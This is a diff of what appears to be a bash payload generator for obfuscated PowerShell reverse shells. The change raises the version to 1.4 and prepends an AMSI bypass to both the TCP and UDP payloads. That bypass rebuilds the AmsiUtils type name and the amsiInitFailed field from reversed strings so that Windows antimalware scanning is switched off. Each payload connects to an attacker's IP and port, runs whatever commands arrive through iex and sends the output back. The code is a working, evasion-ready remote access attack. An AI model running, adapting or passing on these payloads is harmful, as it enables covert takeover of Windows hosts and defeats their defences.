@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.3.9"
+version="1.4"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -429,16 +429,27 @@ receivebytes=$(openssl rand -hex $(shuf -i 1-11 -n1))
 returndata=$(openssl rand -hex $(shuf -i 1-11 -n1))
 x=$(openssl rand -hex $(shuf -i 1-11 -n1))
 result=$(openssl rand -hex $(shuf -i 1-11 -n1))
+a=$(openssl rand -hex $(shuf -i 1-11 -n1))
+b=$(openssl rand -hex $(shuf -i 1-11 -n1))
+c=$(openssl rand -hex $(shuf -i 1-11 -n1))
+d=$(openssl rand -hex $(shuf -i 1-11 -n1))
+e=$(openssl rand -hex $(shuf -i 1-11 -n1))
+f=$(openssl rand -hex $(shuf -i 1-11 -n1))
+g=$(openssl rand -hex $(shuf -i 1-11 -n1))
+h=$(openssl rand -hex $(shuf -i 1-11 -n1))
+i=$(openssl rand -hex $(shuf -i 1-11 -n1))
+j=$(openssl rand -hex $(shuf -i 1-11 -n1))
+k=$(openssl rand -hex $(shuf -i 1-11 -n1))
 
 if [[ $4 == "udp" ]]
 then
 #UDP
 
-shell="\$$endpoint = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,121,83,84,101,109,46,78,101,84,46,105,80,101,78,100,112,111,105,110,84) |%{ ( [char][int] \$_)})) | % {\$_}) ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (83,121,83,84,101,109,46,110,69,116,46,115,111,67,107,101,84,115,46,117,68,80,99,108,105,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_}) ($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes($userinfo);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes(([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (& ([string]::join('', ( (105,101,120) |%{ ( [char][int] \$_)})) | % {\$_}) \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  ([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
+shell="\$$a='slitUismA.';\$$b=\$$a+'noitamotuA';\$$c=\$$b.PadRight(21,'.');\$$d=\$$c+'tnemeganaM';\$$e=\$$d.PadRight(32,'.');\$$f=\$$e+'metsyS';\$$g=\$$f.ToCharArray();[array]::Reverse(\$$g);\$$h= -join(\$$g);\$$i='deliaFtinIisma';\$$j=\$$i.ToCharArray();[array]::Reverse(\$$j);\$$k= -join(\$$j);[Ref].Assembly.GetType(\$$h).GetField(\$$k,'NonPublic,Static').SetValue(\$null,\$true);\$$endpoint = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,121,83,84,101,109,46,78,101,84,46,105,80,101,78,100,112,111,105,110,84) |%{ ( [char][int] \$_)})) | % {\$_}) ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (83,121,83,84,101,109,46,110,69,116,46,115,111,67,107,101,84,115,46,117,68,80,99,108,105,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_}) ($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes($userinfo);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes(([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (& ([string]::join('', ( (105,101,120) |%{ ( [char][int] \$_)})) | % {\$_}) \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  ([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
 
 else
 #TCP
-    shell="\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,89,83,116,101,77,46,110,69,116,46,115,79,99,75,69,116,115,46,116,67,80,67,108,73,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_})('$IP',\$(0-0+0+0-0-0+0+$PORT));\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..$((65535))|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (& ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo + '>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
+    shell="\$$a='slitUismA.';\$$b=\$$a+'noitamotuA';\$$c=\$$b.PadRight(21,'.');\$$d=\$$c+'tnemeganaM';\$$e=\$$d.PadRight(32,'.');\$$f=\$$e+'metsyS';\$$g=\$$f.ToCharArray();[array]::Reverse(\$$g);\$$h= -join(\$$g);\$$i='deliaFtinIisma';\$$j=\$$i.ToCharArray();[array]::Reverse(\$$j);\$$k= -join(\$$j);[Ref].Assembly.GetType(\$$h).GetField(\$$k,'NonPublic,Static').SetValue(\$null,\$true);\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,89,83,116,101,77,46,110,69,116,46,115,79,99,75,69,116,115,46,116,67,80,67,108,73,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_})('$IP',\$(0-0+0+0-0-0+0+$PORT));\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..$((65535))|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (& ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo + '>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
 
 fi
 
